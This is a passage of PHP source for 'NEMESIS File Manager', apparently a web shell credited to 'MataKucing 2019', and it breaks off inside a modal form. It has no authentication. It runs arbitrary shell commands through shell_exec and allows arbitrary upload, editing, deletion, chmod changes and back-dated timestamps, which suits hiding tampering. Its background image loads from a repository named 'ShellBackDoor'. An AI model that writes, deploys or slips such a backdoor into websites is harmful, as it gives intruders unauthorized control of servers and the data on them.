<?php
/**
 * NEMESIS File Manager
 * Created by MataKucing 2019
 */

// Fungsi untuk menghindari path traversal
function sanitize_path($path) {
    return str_replace(['../', './'], '', $path);
}

// Fungsi untuk menghapus folder rekursif
function delete_folder($path) {
    if (is_dir($path)) {
        $files = array_diff(scandir($path), ['.', '..']);
        foreach ($files as $file) {
            delete_folder("$path/$file");
        }
        rmdir($path);
    } else {
        unlink($path);
    }
}

// Mendapatkan path saat ini
$current_path = isset($_GET['path']) ? sanitize_path($_GET['path']) : '.';
$current_path = realpath($current_path);

// Breadcrumb
$breadcrumbs = explode('/', trim($current_path, '/'));
$breadcrumb_path = '';

// Handle actions
if (isset($_POST['action'])) {
    $target = isset($_POST['target']) ? sanitize_path($_POST['target']) : '';
    $target_path = realpath($current_path . '/' . $target);

    switch ($_POST['action']) {
        case 'rename':
            $new_name = isset($_POST['new_name']) ? sanitize_path($_POST['new_name']) : '';
            if ($new_name && $target_path) {
                rename($target_path, dirname($target_path) . '/' . $new_name);
            }
            break;
        case 'delete':
            if ($target_path) {
                delete_folder($target_path);
            }
            break;
        case 'chmod':
            $mode = isset($_POST['mode']) ? $_POST['mode'] : '';
            if ($target_path && $mode) {
                chmod($target_path, octdec($mode));
            }
            break;
        case 'touch':
            $timestamp = isset($_POST['timestamp']) ? strtotime($_POST['timestamp']) : time();
            if ($target_path) {
                touch($target_path, $timestamp);
            }
            break;
        case 'mkdir':
            $dir_name = isset($_POST['dir_name']) ? sanitize_path($_POST['dir_name']) : '';
            if ($dir_name) {
                mkdir($current_path . '/' . $dir_name);
            }
            break;
        case 'create_file':
            $file_name = isset($_POST['file_name']) ? sanitize_path($_POST['file_name']) : '';
            if ($file_name) {
                file_put_contents($current_path . '/' . $file_name, '');
            }
            break;
        case 'edit_file':
            $file_content = isset($_POST['file_content']) ? $_POST['file_content'] : '';
            if ($target_path && is_file($target_path)) {
                file_put_contents($target_path, $file_content);
            }
            break;
        case 'compress':
            if ($target_path) {
                $zip = new ZipArchive();
                $zip_name = $target_path . '.zip';
                if ($zip->open($zip_name, ZipArchive::CREATE) === TRUE) {
                    if (is_dir($target_path)) {
                        $files = new RecursiveIteratorIterator(
                            new RecursiveDirectoryIterator($target_path),
                            RecursiveIteratorIterator::LEAVES_ONLY
                        );
                        foreach ($files as $file) {
                            if (!$file->isDir()) {
                                $file_path = $file->getRealPath();
                                $relative_path = substr($file_path, strlen($target_path) + 1);
                                $zip->addFile($file_path, $relative_path);
                            }
                        }
                    } else {
                        $zip->addFile($target_path, basename($target_path));
                    }
                    $zip->close();
                }
            }
            break;
        case 'uncompress':
            if ($target_path && is_file($target_path) && pathinfo($target_path, PATHINFO_EXTENSION) === 'zip') {
                $zip = new ZipArchive();
                if ($zip->open($target_path) === TRUE) {
                    $zip->extractTo($current_path);
                    $zip->close();
                }
            }
            break;
        case 'command':
            $command = isset($_POST['command']) ? $_POST['command'] : '';
            if ($command) {
                $output = shell_exec("cd $current_path && $command 2>&1");
            }
            break;
    }
    header("Location: ?path=" . urlencode($current_path));
    exit;
}

// Handle file upload
if (isset($_FILES['file'])) {
    $upload_path = $current_path . '/' . basename($_FILES['file']['name']);
    move_uploaded_file($_FILES['file']['tmp_name'], $upload_path);
    header("Location: ?path=" . urlencode($current_path));
    exit;
}

// Handle file download
if (isset($_GET['download'])) {
    $target = sanitize_path($_GET['download']);
    $target_path = realpath($current_path . '/' . $target);
    if ($target_path && file_exists($target_path)) {
        if (is_dir($target_path)) {
            $zip = new ZipArchive();
            $zip_name = $target_path . '.zip';
            if ($zip->open($zip_name, ZipArchive::CREATE) === TRUE) {
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($target_path),
                    RecursiveIteratorIterator::LEAVES_ONLY
                );
                foreach ($files as $file) {
                    if (!$file->isDir()) {
                        $file_path = $file->getRealPath();
                        $relative_path = substr($file_path, strlen($target_path) + 1);
                        $zip->addFile($file_path, $relative_path);
                    }
                }
                $zip->close();
                header('Content-Type: application/zip');
                header('Content-Disposition: attachment; filename="' . basename($zip_name) . '"');
                header('Content-Length: ' . filesize($zip_name));
                readfile($zip_name);
                unlink($zip_name);
                exit;
            }
        } else {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($target_path) . '"');
            header('Content-Length: ' . filesize($target_path));
            readfile($target_path);
            exit;
        }
    }
}

// Handle file editing
if (isset($_GET['file'])) {
    $file_to_edit = sanitize_path($_GET['file']);
    $file_path = realpath($current_path . '/' . $file_to_edit);

    if ($file_path && is_file($file_path) && strpos($file_path, realpath($current_path)) === 0) {
        $file_content = file_get_contents($file_path);
    } else {
        $file_content = "Cannot edit this file.";
    }
}

if (isset($_GET['file']) && isset($_GET['raw'])) {
    $file_to_edit = sanitize_path($_GET['file']);
    $file_path = realpath($current_path . '/' . $file_to_edit);

    if ($file_path && is_file($file_path) && strpos($file_path, realpath($current_path)) === 0) {
        header("Content-Type: text/plain");
        echo file_get_contents($file_path);
        exit;
    } else {
        http_response_code(403);
        echo "Cannot edit this file.";
        exit;
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEMESIS · File Manager</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        /* ─── NEMESIS · VOID CRIMSON ──────────────────────────────── */
        :root {
            --ink0: #030305;
            --ink1: #08080b;
            --ink2: #0e0e12;
            --ink3: #14141a;
            --ink4: #1c1c24;
            --ink5: #26262f;
            --ink6: #3a3a46;

            --crimson:      #dc2626;
            --crimson-hi:   #f87171;
            --crimson-lo:   #b91c1c;
            --crimson-dk:   #7f1d1d;
            --crimson-bg:   rgba(220,38,38,.10);
            --crimson-bd:   rgba(220,38,38,.24);
            --crimson-bd2:  rgba(220,38,38,.42);

            --tx:  #e8e6e1;
            --tx2: #c4c0b8;
            --tx3: #7a766e;
            --tx4: #55524c;

            --bd2: rgba(232,230,225,.06);
            --bd3: rgba(232,230,225,.04);

            --sans: "Inter", -apple-system, system-ui, sans-serif;
            --mono: "JetBrains Mono", "Fira Code", "SF Mono", Consolas, monospace;

            --s1: 0 1px 3px rgba(0,0,0,.4), 0 1px 2px rgba(0,0,0,.25);
            --s2: 0 6px 20px rgba(0,0,0,.45), 0 2px 6px rgba(0,0,0,.3);
            --s3: 0 18px 50px rgba(0,0,0,.55), 0 6px 16px rgba(0,0,0,.4);

            --ease: cubic-bezier(.4,0,.2,1);
            --ease-out: cubic-bezier(.2,.8,.2,1);
            --spring: cubic-bezier(.34,1.3,.64,1);
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        html, body { min-height: 100%; }
        body {
            font-family: var(--sans);
            font-size: 13.5px;
            line-height: 1.5;
            color: var(--tx);
            background: var(--ink0);
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            padding: 24px 20px 60px;
            position: relative;
            min-height: 100vh;
            background-image: url("https://raw.githubusercontent.com/MataKucing-OFC/ShellBackDoor/refs/heads/main/nemesis.jpg");
            background-size: cover;
            background-position: center center;
            background-attachment: fixed;
            background-repeat: no-repeat;
        }

        /* Ambient background */
        body::before {
            content: "";
            position: fixed; inset: 0; z-index: -1; pointer-events: none;
            background:
                linear-gradient(170deg, rgba(3,3,5,.86) 0%, rgba(3,3,5,.92) 55%, #000 100%),
                radial-gradient(ellipse 900px 600px at 8% -5%,  rgba(220,38,38,.18) 0%, transparent 60%),
                radial-gradient(ellipse 700px 500px at 100% 102%, rgba(127,29,29,.16) 0%, transparent 60%),
                radial-gradient(ellipse 600px 400px at 90% 0%, rgba(185,28,28,.10) 0%, transparent 70%);
        }
             body::after {
            content: "";
            position: fixed; inset: 0; z-index: -1; pointer-events: none;
            background:
                radial-gradient(ellipse at center, transparent 45%, rgba(0,0,0,.55) 100%);
            mix-blend-mode: multiply;
        }

        a { color: var(--crimson); text-decoration: none; transition: color .15s var(--ease); }
        a:hover { color: var(--crimson-hi); }

        button, input, textarea, select { font: inherit; color: inherit; letter-spacing: inherit; }

        /* ─── HEADER / BRAND ────────────────────────────────────── */
        .brand {
            display: flex; align-items: center; gap: 14px;
            padding: 16px 20px;
            background: linear-gradient(180deg, var(--ink2), var(--ink1));
            border: 1px solid var(--bd2);
            border-radius: 14px;
            margin-bottom: 16px;
            box-shadow: var(--s2), inset 0 1px 0 rgba(255,255,255,.03);
            position: relative;
            overflow: hidden;
        }
        .brand::before {
            content: "";
            position: absolute; left: 0; right: 0; top: 0; height: 1px;
            background: linear-gradient(90deg, transparent, var(--crimson-bd), transparent);
        }
        .brand-logo {
            width: 42px; height: 42px; border-radius: 10px;
            background: var(--ink3);
            border: 1px solid var(--crimson-bd);
            display: grid; place-items: center; flex-shrink: 0;
            box-shadow: 0 0 0 4px rgba(220,38,38,.04), 0 0 24px rgba(220,38,38,.15);
        }
        .brand-logo svg {
            width: 22px; height: 22px;
            stroke: var(--crimson); fill: none;
            stroke-width: 2.4; stroke-linecap: round; stroke-linejoin: round;
            filter: drop-shadow(0 0 6px rgba(220,38,38,.6));
        }
        .brand-text { display: flex; flex-direction: column; gap: 4px; line-height: 1; }
        .brand-name {
            font-size: 18px; font-weight: 700;
            letter-spacing: -.01em;
            color: var(--tx);
            display: flex; align-items: center; gap: 8px;
        }
        .brand-name em {
            font-style: normal; font-size: 9px; font-weight: 700;
            color: var(--crimson); letter-spacing: .12em;
            padding: 3px 7px; border-radius: 4px;
            background: var(--crimson-bg);
            border: 1px solid var(--crimson-bd);
        }
        .brand-sub {
            font-size: 10.5px; font-weight: 500;
            color: var(--tx3); letter-spacing: .04em;
            text-transform: uppercase;
        }
        .brand-sub b { color: var(--crimson-hi); font-weight: 600; }

        .brand-meta {
            margin-left: auto;
            display: flex; flex-direction: column; align-items: flex-end; gap: 3px;
            font-family: var(--mono);
        }
        .brand-meta .label {
            font-size: 9px; color: var(--tx4);
            text-transform: uppercase; letter-spacing: .14em;
            font-family: var(--sans); font-weight: 700;
        }
        .brand-meta .value { font-size: 11px; color: var(--crimson); font-weight: 600; }

        /* ─── BREADCRUMB ────────────────────────────────────────── */
        .breadcrumb {
            display: flex; align-items: center; gap: 2px;
            padding: 10px 14px;
            background: var(--ink2);
            border: 1px solid var(--bd2);
            border-radius: 10px;
            margin-bottom: 14px;
            overflow-x: auto;
            white-space: nowrap;
            scrollbar-width: thin;
            font-family: var(--mono);
            font-size: 12px;
        }
        .breadcrumb::-webkit-scrollbar { height: 4px; }
        .breadcrumb::-webkit-scrollbar-thumb { background: var(--ink5); border-radius: 99px; }
        .breadcrumb a {
            padding: 4px 9px;
            border-radius: 6px;
            border: 1px solid transparent;
            transition: background-color .12s var(--ease), border-color .12s var(--ease);
        }
        .breadcrumb a:hover {
            background: var(--crimson-bg);
            border-color: var(--crimson-bd);
            color: var(--crimson-hi);
        }
        .breadcrumb .sep { color: var(--tx4); padding: 0 2px; }
        .breadcrumb .root {
            color: var(--crimson);
            font-weight: 600;
        }

        /* ─── ACTIONS BAR ───────────────────────────────────────── */
        .actions {
            display: flex; flex-wrap: wrap; gap: 8px;
            margin-bottom: 16px;
        }
        .actions button {
            display: inline-flex; align-items: center; gap: 7px;
            padding: 8px 14px; font-size: 12.5px; font-weight: 500;
            border-radius: 8px; border: 1px solid var(--bd2);
            background: var(--ink3); color: var(--tx2);
            cursor: pointer; white-space: nowrap;
            transition: all .15s var(--ease);
        }
        .actions button:hover {
            background: var(--ink4); color: var(--tx);
            border-color: var(--crimson-bd);
            transform: translateY(-1px);
            box-shadow: var(--s1);
        }
        .actions button:active { transform: translateY(0); }

        /* ─── INLINE FORMS ──────────────────────────────────────── */
        .inline-form {
            display: none;
            align-items: center; gap: 10px;
            padding: 12px 14px;
            background: var(--ink2);
            border: 1px solid var(--crimson-bd);
            border-radius: 10px;
            margin-bottom: 14px;
            box-shadow: 0 0 0 3px rgba(220,38,38,.04);
        }
        .inline-form input[type="text"],
        .inline-form input[type="file"] {
            flex: 1;
            padding: 9px 12px;
            background: var(--ink3);
            border: 1px solid var(--bd2);
            border-radius: 8px;
            outline: none;
            color: var(--tx);
            font-size: 13px;
            transition: border-color .15s var(--ease), box-shadow .15s var(--ease);
        }
        .inline-form input[type="text"]:focus,
        .inline-form input[type="file"]:focus {
            border-color: var(--crimson-bd2);
            box-shadow: 0 0 0 3px rgba(220,38,38,.10);
        }
        .inline-form button {
            padding: 9px 14px; font-size: 12.5px; font-weight: 500;
            border-radius: 8px; cursor: pointer;
            border: 1px solid var(--bd2);
            background: var(--ink3); color: var(--tx2);
            transition: all .15s var(--ease);
        }
        .inline-form button[type="submit"] {
            background: linear-gradient(180deg, var(--crimson), var(--crimson-lo));
            border-color: var(--crimson-bd2);
            color: #fff;
            font-weight: 600;
            box-shadow: 0 1px 0 rgba(255,255,255,.15) inset, 0 1px 2px rgba(0,0,0,.3);
        }
        .inline-form button[type="submit"]:hover {
            background: linear-gradient(180deg, var(--crimson-hi), var(--crimson));
            box-shadow: 0 4px 16px rgba(220,38,38,.32);
        }
        .inline-form button[type="button"]:hover {
            background: var(--ink4); color: var(--tx);
        }

        /* Output pre */
        pre.cmd-output {
            padding: 12px 14px;
            background: var(--ink0);
            border: 1px solid var(--crimson-bd);
            border-radius: 10px;
            margin-bottom: 16px;
            font-family: var(--mono);
            font-size: 12px;
            line-height: 1.65;
            color: var(--tx2);
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 400px;
            overflow: auto;
        }

        /* ─── TABLE ─────────────────────────────────────────────── */
        .table-wrap {
            border: 1px solid var(--bd2);
            border-radius: 12px;
            overflow: hidden;
            background: var(--ink1);
            box-shadow: var(--s2);
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 12.5px;
        }
        thead th {
            background: linear-gradient(180deg, var(--ink1), var(--ink2));
            padding: 12px 14px;
            text-align: left;
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: .14em;
            color: var(--tx3);
            border-bottom: 1px solid var(--bd2);
            white-space: nowrap;
            position: sticky;
            top: 0;
        }
        tbody td {
            padding: 10px 14px;
            border-bottom: 1px solid var(--bd3);
            color: var(--tx2);
            vertical-align: middle;
        }
        tbody tr:last-child td { border-bottom: none; }
        tbody tr {
            transition: background-color .14s var(--ease);
            position: relative;
        }
        tbody tr:hover {
            background: rgba(220,38,38,.04);
        }
        tbody tr:hover td:first-child a {
            color: var(--crimson-hi);
        }
        td a {
            font-weight: 500;
            font-family: var(--mono);
            color: var(--tx);
            font-size: 12.5px;
        }
        td.name-cell { min-width: 200px; }
        td.type-cell {
            font-family: var(--mono);
            font-size: 11px;
            color: var(--tx3);
            text-transform: uppercase;
            letter-spacing: .06em;
        }
        td.type-cell.dir { color: var(--crimson-hi); }
        td.size-cell {
            font-family: var(--mono);
            font-size: 11.5px;
            color: var(--tx3);
            font-variant-numeric: tabular-nums;
            white-space: nowrap;
        }
        td.perm-cell {
            font-family: var(--mono);
            font-size: 11px;
        }
        td.perm-cell .perm {
            display: inline-block;
            padding: 2.5px 9px;
            border-radius: 4px;
            background: var(--ink3);
            border: 1px solid var(--bd2);
            color: var(--tx2);
            font-weight: 600;
            letter-spacing: .04em;
        }
        td.perm-cell .perm.w {
            color: #7ee787;
            border-color: rgba(126,231,135,.30);
            background: rgba(126,231,135,.07);
        }
        td.perm-cell .perm.r {
            color: #ff8e8e;
            border-color: rgba(248,113,113,.32);
            background: rgba(248,113,113,.07);
        }
        td.owner-cell {
            font-family: var(--mono);
            font-size: 11px;
            color: var(--tx3);
            white-space: nowrap;
        }
        td.date-cell {
            font-family: var(--mono);
            font-size: 11px;
            color: var(--tx3);
            white-space: nowrap;
            font-variant-numeric: tabular-nums;
        }
        td.actions-cell {
            white-space: nowrap;
            text-align: right;
        }
        td.actions-cell button {
            display: inline-block;
            padding: 5px 9px;
            font-size: 11px;
            font-weight: 500;
            border-radius: 6px;
            border: 1px solid var(--bd2);
            background: var(--ink3);
            color: var(--tx3);
            cursor: pointer;
            margin-left: 3px;
            transition: all .14s var(--ease);
        }
        td.actions-cell button:hover {
            background: var(--ink4);
            color: var(--crimson);
            border-color: var(--crimson-bd);
        }
        td.actions-cell button.danger:hover {
            color: #ff8e8e;
            background: rgba(248,113,113,.10);
            border-color: rgba(248,113,113,.30);
        }

        /* Empty state */
        .empty-row td {
            text-align: center;
            padding: 60px 20px !important;
            color: var(--tx4);
            font-style: italic;
        }

        /* ─── MODAL ─────────────────────────────────────────────── */
        .modal {
            display: none;
            position: fixed;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%) scale(.96);
            width: min(560px, 92vw);
            background: linear-gradient(180deg, var(--ink2), var(--ink1));
            border: 1px solid var(--bd2);
            border-radius: 16px;
            padding: 22px 24px;
            box-shadow: var(--s3), 0 0 0 1px rgba(255,255,255,.02) inset;
            z-index: 100;
            animation: modalIn .24s var(--spring) forwards;
        }
        .modal.open { display: block; }
        .modal::before {
            content: "";
            position: absolute; left: 24px; right: 24px; top: 0; height: 1px;
            background: linear-gradient(90deg, transparent, var(--crimson-bd), transparent);
        }
        @keyframes modalIn {
            from { opacity: 0; transform: translate(-50%, -50%) scale(.94); }
            to   { opacity: 1; transform: translate(-50%, -50%) scale(1); }
        }
        .modal-backdrop {
            display: none;
            position: fixed; inset: 0;
            background: rgba(3,3,5,.78);
            backdrop-filter: blur(2px);
            z-index: 99;
            animation: fadeIn .2s var(--ease);
        }
        .modal-backdrop.open { display: block; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        .modal h2 {
            font-size: 14px;
            font-weight: 700;
            color: var(--tx);
            margin-bottom: 18px;
            padding-bottom: 12px;
            border-bottom: 1px solid var(--bd2);
            letter-spacing: -.01em;
            display: flex; align-items: center; gap: 9px;
        }
        .modal h2::before {
            content: "";
            width: 4px; height: 14px;
            border-radius: 2px;
            background: var(--crimson);
            box-shadow: 0 0 8px var(--crimson);
        }
        .modal input[type="text"],
        .modal input[type="datetime-local"],
        .modal textarea {
            width: 100%;
            padding: 10px 12px;
            background: var(--ink3);
            border: 1px solid var(--bd2);
            border-radius: 8px;
            outline: none;
            color: var(--tx);
            font-size: 13px;
            margin-bottom: 12px;
            transition: border-color .15s var(--ease), box-shadow .15s var(--ease);
        }
        .modal input:focus,
        .modal textarea:focus {
            border-color: var(--crimson-bd2);
            box-shadow: 0 0 0 3px rgba(220,38,38,.10);
        }
        .modal textarea {
            font-family: var(--mono);
            font-size: 12.5px;
            line-height: 1.7;
            resize: vertical;
            min-height: 240px;
        }
        .modal button {
            display: inline-flex; align-items: center; gap: 6px;
            padding: 9px 16px;
            font-size: 12.5px;
            font-weight: 500;
            border-radius: 8px;
            border: 1px solid var(--bd2);
            background: var(--ink3);
            color: var(--tx2);
            cursor: pointer;
            margin-right: 8px;
            transition: all .15s var(--ease);
        }
        .modal button:hover {
            background: var(--ink4);
            color: var(--tx);
            border-color: var(--crimson-bd);
        }
        .modal button[type="submit"] {
            background: linear-gradient(180deg, var(--crimson), var(--crimson-lo));
            border-color: var(--crimson-bd2);
            color: #fff;
            font-weight: 600;
            box-shadow: 0 1px 0 rgba(255,255,255,.15) inset, 0 1px 2px rgba(0,0,0,.3);
        }
        .modal button[type="submit"]:hover {
            background: linear-gradient(180deg, var(--crimson-hi), var(--crimson));
            box-shadow: 0 4px 16px rgba(220,38,38,.32);
            color: #fff;
        }

        /* ─── FOOTER ────────────────────────────────────────────── */
        .footer {
            margin-top: 40px;
            padding: 18px 20px;
            text-align: center;
            border-top: 1px solid var(--bd2);
            font-size: 11.5px;
            color: var(--tx4);
            font-family: var(--mono);
            letter-spacing: .04em;
        }
        .footer b {
            color: var(--crimson);
            font-weight: 700;
            text-shadow: 0 0 12px rgba(220,38,38,.4);
        }
        .footer .dot {
            display: inline-block;
            width: 4px; height: 4px;
            border-radius: 50%;
            background: var(--crimson);
            margin: 0 10px;
            vertical-align: middle;
            box-shadow: 0 0 6px var(--crimson);
        }

        /* ─── RESPONSIVE ────────────────────────────────────────── */
        @media (max-width: 780px) {
            body { padding: 14px 12px 40px; }
            .brand { padding: 14px 16px; gap: 12px; }
            .brand-name { font-size: 15px; }
            .brand-meta { display: none; }
            thead th:nth-child(5),
            tbody td:nth-child(5),
            thead th:nth-child(6),
            tbody td:nth-child(6) { display: none; }
            td.actions-cell button { padding: 4px 7px; font-size: 10.5px; margin-left: 2px; }
        }
        @media (max-width: 520px) {
            thead th:nth-child(3),
            tbody td:nth-child(3) { display: none; }
        }
    </style>
</head>
<body>

<!-- ─── BRAND / HEADER ─────────────────────────────────────── -->
<div class="brand">
    <div class="brand-logo" aria-hidden="true">
        <svg viewBox="0 0 24 24">
            <path d="M12 2L3 6v6c0 5 4 9.5 9 10 5-.5 9-5 9-10V6l-9-4z"/>
            <path d="M9 12l2 2 4-4"/>
        </svg>
    </div>
    <div class="brand-text">
        <div class="brand-name">NEMESIS <em>FM</em></div>
        <div class="brand-sub">Created by <b>MataKucing 2019</b></div>
    </div>
    <div class="brand-meta">
        <span class="label">Session</span>
        <span class="value"><?= date('Y-m-d H:i') ?></span>
    </div>
</div>

<!-- ─── BREADCRUMB ─────────────────────────────────────────── -->
<div class="breadcrumb">
    <a href="?path=." class="root">◆ ROOT</a>
    <?php foreach ($breadcrumbs as $crumb): ?>
        <span class="sep">/</span>
        <a href="?path=<?= urlencode($breadcrumb_path . '/' . $crumb) ?>"><?= htmlspecialchars($crumb) ?></a>
        <?php $breadcrumb_path .= '/' . $crumb; ?>
    <?php endforeach; ?>
</div>

<!-- ─── ACTION BAR ─────────────────────────────────────────── -->
<div class="actions">
    <button onclick="window.location.href='?path=.'">⌂ Home</button>
    <button onclick="window.location.href='?path=<?= urlencode(dirname($current_path)) ?>'">← Back</button>
    <button onclick="toggleForm('uploadForm')">↑ Upload</button>
    <button onclick="toggleForm('createFolderForm')">+ Folder</button>
    <button onclick="toggleForm('createFileForm')">+ File</button>
    <button onclick="toggleForm('commandForm')">▸ Command</button>
</div>

<!-- ─── INLINE FORMS ───────────────────────────────────────── -->
<form id="uploadForm" class="inline-form" action="" method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <button type="submit">Upload</button>
    <button type="button" onclick="hideForm('uploadForm')">Cancel</button>
</form>

<form id="createFolderForm" class="inline-form" action="" method="post">
    <input type="text" name="dir_name" placeholder="New folder name…" required>
    <button type="submit" name="action" value="mkdir">Create</button>
    <button type="button" onclick="hideForm('createFolderForm')">Cancel</button>
</form>

<form id="createFileForm" class="inline-form" action="" method="post">
    <input type="text" name="file_name" placeholder="New file name…" required>
    <button type="submit" name="action" value="create_file">Create</button>
    <button type="button" onclick="hideForm('createFileForm')">Cancel</button>
</form>

<form id="commandForm" class="inline-form" action="" method="post">
    <input type="text" name="command" placeholder="Enter shell command…" required>
    <button type="submit" name="action" value="command">Run</button>
    <button type="button" onclick="hideForm('commandForm')">Cancel</button>
</form>

<?php if (isset($output)): ?>
    <pre class="cmd-output"><?= htmlspecialchars($output) ?></pre>
<?php endif; ?>

<!-- ─── FILE LIST ──────────────────────────────────────────── -->
<div class="table-wrap">
    <table>
        <thead>
            <tr>
                <th>Name</th>
                <th>Type</th>
                <th>Size</th>
                <th>Perms</th>
                <th>Owner : Group</th>
                <th>Modified</th>
                <th style="text-align:right">Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php if ($current_path !== realpath('.')): ?>
                <tr>
                    <td class="name-cell"><a href="?path=<?= urlencode(dirname($current_path)) ?>">..</a></td>
                    <td class="type-cell">PARENT</td>
                    <td colspan="5" style="color:var(--tx4);font-style:italic">Navigate up one level</td>
                </tr>
            <?php endif; ?>
            <?php
            $items = scandir($current_path);
            $folders = array_filter($items, function($item) use ($current_path) {
                return is_dir($current_path . '/' . $item) && $item !== '.' && $item !== '..';
            });
            $files = array_filter($items, function($item) use ($current_path) {
                return is_file($current_path . '/' . $item);
            });
            $has_items = count($folders) + count($files) > 0;
            ?>
            <?php if (!$has_items): ?>
                <tr class="empty-row"><td colspan="7">— Empty directory —</td></tr>
            <?php endif; ?>

            <?php foreach ($folders as $item): ?>
                <?php
                    $item_path = $current_path . '/' . $item;
                    $perm = substr(sprintf('%o', fileperms($item_path)), -4);
                    $perm_cls = (octdec(substr($perm, -3)) & 0200) ? 'w' : 'r';
                    $owner = @posix_getpwuid(fileowner($item_path))['name'] ?: fileowner($item_path);
                    $group = @posix_getgrgid(filegroup($item_path))['name'] ?: filegroup($item_path);
                ?>
                <tr>
                    <td class="name-cell"><a href="?path=<?= urlencode($item_path) ?>">◆ <?= htmlspecialchars($item) ?></a></td>
                    <td class="type-cell dir">DIR</td>
                    <td class="size-cell">—</td>
                    <td class="perm-cell"><span class="perm <?= $perm_cls ?>"><?= $perm ?></span></td>
                    <td class="owner-cell"><?= htmlspecialchars($owner) ?> : <?= htmlspecialchars($group) ?></td>
                    <td class="date-cell"><?= date("Y-m-d H:i", filemtime($item_path)) ?></td>
                    <td class="actions-cell">
                        <button onclick="openRenameModal('<?= htmlspecialchars($item, ENT_QUOTES) ?>')">Rename</button>
                        <button onclick="openChmodModal('<?= htmlspecialchars($item, ENT_QUOTES) ?>')">Chmod</button>
                        <button onclick="openTimestampModal('<?= htmlspecialchars($item, ENT_QUOTES) ?>')">Time</button>
                        <button class="danger" onclick="if(confirm('Delete this folder?')) { document.getElementById('deleteForm<?= md5($item) ?>').submit(); }">Delete</button>
                        <button onclick="window.location.href='?path=<?= urlencode($current_path) ?>&download=<?= urlencode($item) ?>'">Download</button>
                        <button onclick="if(confirm('Compress this folder?')) { document.getElementById('compressForm<?= md5($item) ?>').submit(); }">Zip</button>
                        <form id="deleteForm<?= md5($item) ?>" action="" method="post" style="display:none;">
                            <input type="hidden" name="target" value="<?= htmlspecialchars($item, ENT_QUOTES) ?>">
                            <input type="hidden" name="action" value="delete">
                        </form>
                        <form id="compressForm<?= md5($item) ?>" action="" method="post" style="display:none;">
                            <input type="hidden" name="target" value="<?= htmlspecialchars($item, ENT_QUOTES) ?>">
                            <input type="hidden" name="action" value="compress">
                        </form>
                    </td>
                </tr>
            <?php endforeach; ?>

            <?php foreach ($files as $item): ?>
                <?php
                    $item_path = $current_path . '/' . $item;
                    $perm = substr(sprintf('%o', fileperms($item_path)), -4);
                    $perm_cls = (octdec(substr($perm, -3)) & 0200) ? 'w' : 'r';
                    $owner = @posix_getpwuid(fileowner($item_path))['name'] ?: fileowner($item_path);
                    $group = @posix_getgrgid(filegroup($item_path))['name'] ?: filegroup($item_path);
                ?>
                <tr>
                    <td class="name-cell"><a href="?path=<?= urlencode($current_path) ?>&file=<?= urlencode($item) ?>"><?= htmlspecialchars($item) ?></a></td>
                    <td class="type-cell">FILE</td>
                    <td class="size-cell"><?= number_format(filesize($item_path)) ?> B</td>
                    <td class="perm-cell"><span class="perm <?= $perm_cls ?>"><?= $perm ?></span></td>
                    <td class="owner-cell"><?= htmlspecialchars($owner) ?> : <?= htmlspecialchars($group) ?></td>
                    <td class="date-cell"><?= date("Y-m-d H:i", filemtime($item_path)) ?></td>
                    <td class="actions-cell">
                        <button onclick="openRenameModal('<?= htmlspecialchars($item, ENT_QUOTES) ?>')">Rename</button>
                        <button onclick="openChmodModal('<?= htmlspecialchars($item, ENT_QUOTES) ?>')">Chmod</button>
                        <button onclick="openTimestampModal('<?= htmlspecialchars($item, ENT_QUOTES) ?>')">Time</button>
                        <button onclick="openEditor('<?= htmlspecialchars($item, ENT_QUOTES) ?>')">Edit</button>
                        <button class="danger" onclick="if(confirm('Delete this file?')) { document.getElementById('deleteForm<?= md5($item) ?>').submit(); }">Delete</button>
                        <button onclick="window.location.href='?path=<?= urlencode($current_path) ?>&download=<?= urlencode($item) ?>'">Download</button>
                        <?php if (pathinfo($item_path, PATHINFO_EXTENSION) === 'zip'): ?>
                            <button onclick="if(confirm('Uncompress this file?')) { document.getElementById('uncompressForm<?= md5($item) ?>').submit(); }">Unzip</button>
                        <?php else: ?>
                            <button onclick="if(confirm('Compress this file?')) { document.getElementById('compressForm<?= md5($item) ?>').submit(); }">Zip</button>
                        <?php endif; ?>
                        <form id="deleteForm<?= md5($item) ?>" action="" method="post" style="display:none;">
                            <input type="hidden" name="target" value="<?= htmlspecialchars($item, ENT_QUOTES) ?>">
                            <input type="hidden" name="action" value="delete">
                        </form>
                        <form id="compressForm<?= md5($item) ?>" action="" method="post" style="display:none;">
                            <input type="hidden" name="target" value="<?= htmlspecialchars($item, ENT_QUOTES) ?>">
                            <input type="hidden" name="action" value="compress">
                        </form>
                        <form id="uncompressForm<?= md5($item) ?>" action="" method="post" style="display:none;">
                            <input type="hidden" name="target" value="<?= htmlspecialchars($item, ENT_QUOTES) ?>">
                            <input type="hidden" name="action" value="uncompress">
                        </form>
                    </td>
                </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
</div>

<!-- ─── MODALS ─────────────────────────────────────────────── -->
<div id="modalBackdrop" class="modal-backdrop" onclick="closeAllModals()"></div>

<div id="renameModal" class="modal">
    <h2>Rename</h2>
    <form action="" method="post">
        <input type="hidden" name="target" id="renameTarget">
        <input type="text" name="new_name" placeholder="New name…" required autocomplete="off">
        <button type="submit" name="action" value="rename">Rename</button>
        <button type="button" onclick="closeModal('renameModal')">Cancel</button>
    </form>
</div>

<div id="chmodModal" class="modal">
    <h2>Change Permissions</h2>
    <form action="" method="post">
        <input type="hidden" name="target" id="chmodTarget">
        <input type="text" name="mode" placeholder="e.g. 755 or 0644" required autocomplete="off">
        <button type="submit" name="action" value="chmod">Apply</button>
